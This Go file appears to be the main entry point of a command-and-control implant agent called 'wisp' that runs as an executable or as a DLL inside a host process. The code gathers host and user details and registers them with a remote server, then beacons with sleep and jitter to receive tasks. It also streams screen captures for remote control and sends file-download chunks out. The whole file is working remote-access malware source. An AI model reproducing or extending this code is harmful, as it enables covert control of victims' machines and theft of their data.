package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"math/big"
	"os"
	"runtime"
	"time"

	"github.com/user/wisp/agent/commands"
	"github.com/user/wisp/agent/config"
	"github.com/user/wisp/agent/platform"
	"github.com/user/wisp/agent/transport"
	"github.com/user/wisp/shared/protocol"
)

// main is the standalone (exe) entry point. When the agent is compiled as a
// shared library (DLL) with -buildmode=c-shared, main() is not executed; the
// exported Run() in export_windows.go is used instead.
func main() {
	// An agent must survive and self-diagnose: any unexpected panic in a
	// background goroutine (RCP, RDP, shell) would otherwise kill the whole
	// process silently. Recover, print the stack and exit with a visible error.
	defer func() {
		if r := recover(); r != nil {
			buf := make([]byte, 1<<16)
			n := runtime.Stack(buf, true)
			fmt.Fprintf(os.Stderr, "\n[agent] PANIC: %v\n%s\n", r, buf[:n])
			os.Exit(1)
		}
	}()

	if err := agentMain(true); err != nil {
		fmt.Fprintf(os.Stderr, "Agent error: %v\n", err)
		os.Exit(1)
	}
}

// agentMain runs the full agent logic. cli enables development flags and
// overrides; when false (loaded as a DLL) it uses the compiled-in config only,
// and never calls os.Exit / flag.Parse (which could terminate the host process).
func agentMain(cli bool) error {
	var cfg *config.Config
	var err error

	if cli {
		// CLI flags for development
		var (
			serverHost    string
			serverPort    int
			useTLS        bool
			transportName string
			sleep         int
			jitter        int
			psk           string
			fingerprint   string
		)
		flag.StringVar(&serverHost, "server", "", "Server host (overrides compiled config)")
		flag.IntVar(&serverPort, "port", 0, "Server port (overrides compiled config)")
		flag.BoolVar(&useTLS, "tls", false, "Use TLS")
		flag.StringVar(&transportName, "transport", "", "Transport: tcp, kcp or http (overrides compiled config)")
		flag.IntVar(&sleep, "sleep", 5000, "Sleep interval in ms")
		flag.IntVar(&jitter, "jitter", 0, "Jitter percentage")
		flag.StringVar(&psk, "psk", "", "Pre-shared key (must match the listener PSK)")
		flag.StringVar(&fingerprint, "fingerprint", "", "TLS certificate SHA-256 pin (hex), e.g. for HTTPS listeners")
		flag.Parse()

		if serverHost != "" && serverPort != 0 {
			cfg = config.LoadFromArgs(serverHost, serverPort, useTLS, sleep, jitter)
			if transportName != "" {
				cfg.Transport = transportName
			}
			if psk != "" {
				cfg.PSK = psk
			}
			if fingerprint != "" {
				cfg.ServerFingerprint = fingerprint
			}
		} else {
			cfg, err = config.Load()
			if err != nil {
				return fmt.Errorf("no server configuration compiled into this binary: %w\n  run with: agent.exe -server HOST -port PORT [-tls] [-transport tcp|kcp|http] [-sleep 5000] [-fingerprint <cert pin>]", err)
			}
		}
	} else {
		// DLL mode: only the compiled-in config is honored.
		cfg, err = config.Load()
		if err != nil {
			return fmt.Errorf("no server configuration compiled into this module: %w", err)
		}
	}

	// Refuse to run past the compiled-in kill date
	if isKilled(cfg.KillDate) {
		fmt.Fprintln(os.Stderr, "Agent is past its kill date, exiting.")
		return nil
	}

	// Generate agent ID
	agentID := generateID()

	// Gather system info
	hostname, _ := os.Hostname()

	regData := map[string]any{
		"id":           agentID,
		"hostname":     hostname,
		"username":     getUsername(),
		"domain":       platform.GetDomain(),
		"internal_ip":  platform.GetInternalIP(),
		"os":           fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
		"arch":         runtime.GOARCH,
		"pid":          os.Getpid(),
		"process_name": platform.GetProcessPath(),
		"is_elevated":  platform.IsElevated(),
		"sleep":        cfg.Sleep,
		"jitter":       cfg.Jitter,
		"psk":          cfg.PSK,
	}

	regJSON, _ := json.Marshal(regData)

	// Create transport (tcp by default, kcp/http/https via payload config)
	var tp transport.Transport
	switch cfg.Transport {
	case "http", "https":
		tp = transport.NewHTTPTransport(cfg.ServerHost, cfg.ServerPort, cfg.UseTLS, agentID, cfg.RSAPublicKey, cfg.ServerFingerprint)
	case "kcp":
		tp = transport.NewKCPTransport(cfg.ServerHost, cfg.ServerPort, agentID, cfg.RSAPublicKey)
	default:
		tp = &transport.TCPTransport{
			Host:        cfg.ServerHost,
			Port:        cfg.ServerPort,
			UseTLS:      cfg.UseTLS,
			AgentID:     agentID,
			RSAPubPEM:   cfg.RSAPublicKey,
			Fingerprint: cfg.ServerFingerprint,
		}
	}

	// Set up dispatcher
	running := true
	dispatcher := commands.NewDispatcher(
		func(s, j int) {
			cfg.Sleep = s
			cfg.Jitter = j
		},
		func() {
			running = false
		},
	)
	// Standalone agents may hard-exit on CmdClientKill; DLL agents must not
	// kill their host process.
	dispatcher.SetForceExit(cli)

	// Remote control channel: long-lived TCP or KCP stream (chosen per window
	// by the server and carried inside CmdRCPConnect args), independent of the
	// sleep interval. Reuses the same session keys for handshake authentication.
	// The RSA public key is taken from the transport (which fetched it during
	// registration when the binary had no compiled-in key).
	var sessionKeys *protocol.SessionKeys
	var rsaPubPEM string
	switch t := tp.(type) {
	case *transport.TCPTransport:
		sessionKeys = t.Keys
		rsaPubPEM = t.RSAPubPEM
	case *transport.HTTPTransport:
		sessionKeys = t.Keys
		rsaPubPEM = t.RSAPubPEM
	case *transport.KCPTransport:
		sessionKeys = t.Keys
		rsaPubPEM = t.RSAPubPEM
	}
	dispatcher.SetRCPClient(&transport.RCPClient{
		Host:      cfg.ServerHost,
		AgentID:   agentID,
		Keys:      sessionKeys,
		RSAPubPEM: rsaPubPEM,
		Capture:   commands.CaptureScreen,
		OnInput:   func(msg string) { commands.HandleRCPInput(msg) },
		Quality:   45,
		Interval:  50 * time.Millisecond, // 20 fps
	})

	// syncRCPSessionKeys copies the transport's freshly negotiated session keys
	// into the RCP client. The RCP channel authenticates with the same keys, so
	// after every re-registration they MUST be refreshed — otherwise the server
	// (which stores the newest keys per agent ID) encrypts the RCP handshake ACK
	// with keys the client no longer has, and every remote-control attempt fails
	// with "decrypt ack: HMAC verification failed".
	syncRCPSessionKeys := func() {
		rc := dispatcher.RCPClient()
		if rc == nil {
			return
		}
		switch t := tp.(type) {
		case *transport.TCPTransport:
			rc.Keys = t.Keys
			rc.RSAPubPEM = t.RSAPubPEM
		case *transport.HTTPTransport:
			rc.Keys = t.Keys
			rc.RSAPubPEM = t.RSAPubPEM
		case *transport.KCPTransport:
			rc.Keys = t.Keys
			rc.RSAPubPEM = t.RSAPubPEM
		}
	}

	// Register with retry using exponential backoff. A dead endpoint must not
	// cause a retry storm — that previously tripped the server's per-IP rate
	// limiter and blocked every other agent from the same IP. Each successful
	// registration refreshes the RCP client's session keys (the server rotated
	// them per registration, so stale keys would fail every RCP handshake).
	backoff := time.Duration(cfg.Sleep) * time.Millisecond
	if backoff < time.Second {
		backoff = time.Second
	}
	for {
		if err := tp.Register(regJSON); err == nil {
			syncRCPSessionKeys()
			break
		}
		time.Sleep(backoff)
		backoff *= 2
		if backoff > time.Minute {
			backoff = time.Minute
		}
	}

	// Main checkin loop
	for running {
		// Sleep with jitter (safe against zero-range jitter, see jitterOffset)
		sleepDuration := time.Duration(cfg.Sleep)*time.Millisecond + jitterOffset(cfg.Sleep, cfg.Jitter)
		time.Sleep(sleepDuration)

		if !running {
			break
		}

		// Stop polling once the kill date has been reached
		if isKilled(cfg.KillDate) {
			break
		}

		// Checkin (send no results initially)
		tasksData, err := tp.Checkin(nil)
		if err != nil {
			if errors.Is(err, transport.ErrReauth) {
				// The server lost our session (e.g. it restarted), or the
				// short-lived connection failed. Re-register with backoff.
				regBackoff := sleepDuration
				if regBackoff < time.Second {
					regBackoff = time.Second
				}
				for {
					if regErr := tp.Register(regJSON); regErr == nil {
						syncRCPSessionKeys()
						break
					}
					if isKilled(cfg.KillDate) {
						running = false
						break
					}
					time.Sleep(regBackoff)
					regBackoff *= 2
					if regBackoff > time.Minute {
						regBackoff = time.Minute
					}
				}
			}
			continue
		}

		if len(tasksData) == 0 || string(tasksData) == "[]" {
			// No pending tasks, but a remote-desktop frame may still need to
			// be reported. Without this the frame would never leave the agent
			// because the main loop skips the result-sending branch.
			if frame := dispatcher.RDPFrame(); frame != nil {
				frameJSON, _ := json.Marshal([]commands.Result{*frame})
				tp.Checkin(frameJSON)
			}
			continue
		}

		// Process tasks
		results, err := dispatcher.ProcessTasks(tasksData)
		if err != nil {
			continue
		}

		// Attach the newest remote-desktop frame, if a stream is active
		if frame := dispatcher.RDPFrame(); frame != nil {
			results = append(results, *frame)
		}

		// Merge queued download chunks (if any) with this batch
		pending := dispatcher.DrainPending()
		if len(results) > 0 || len(pending) > 0 {
			results = append(results, pending...)
			resultsJSON, _ := json.Marshal(results)
			// Send results (failures are silent; the loop continues)
			if _, err := tp.Checkin(resultsJSON); err != nil {
				if errors.Is(err, transport.ErrReauth) {
					tp.Register(regJSON)
				}
			}
		}
	}
	return nil
}

func generateID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func getUsername() string {
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return "unknown"
}

// isKilled reports whether the kill date (Unix seconds) has been reached.
// A zero or negative kill date means the agent never expires.
func isKilled(killDate int64) bool {
	if killDate <= 0 {
		return false
	}
	return time.Now().Unix() > killDate
}

// jitterOffset returns a +/-jitter% offset (ms) for the sleep interval.
// crypto/rand.Int panics when its argument is <= 0, so a zero range (e.g. a
// tiny sleep with a small jitter percentage) is clamped to 1ms. This bug made
// freshly generated payloads crash on startup.
func jitterOffset(sleep, jitterPct int) time.Duration {
	// Defense in depth: clamp jitter to 100% so the effective interval can
	// never go negative (busy-loop) even if a CLI flag passes an absurd value.
	if jitterPct > protocol.MaxJitterPct {
		jitterPct = protocol.MaxJitterPct
	}
	if jitterPct <= 0 || sleep <= 0 {
		return 0
	}
	r := int64(sleep) * int64(jitterPct) / 100
	if r <= 0 {
		r = 1
	}
	n, err := rand.Int(rand.Reader, big.NewInt(r*2))
	if err != nil {
		return 0
	}
	return time.Duration(n.Int64()-r) * time.Millisecond
}
